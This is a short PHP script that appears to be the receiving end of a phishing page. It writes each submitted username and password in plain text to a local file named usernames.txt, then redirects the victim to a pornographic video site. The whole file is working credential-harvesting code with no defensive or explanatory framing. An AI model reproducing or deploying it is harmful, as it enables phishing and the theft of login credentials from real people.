<?php

file_put_contents("usernames.txt", "username: " . $_POST['username'] . " pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://spankbang.com/19ykd/video/scene+full+hd');
exit();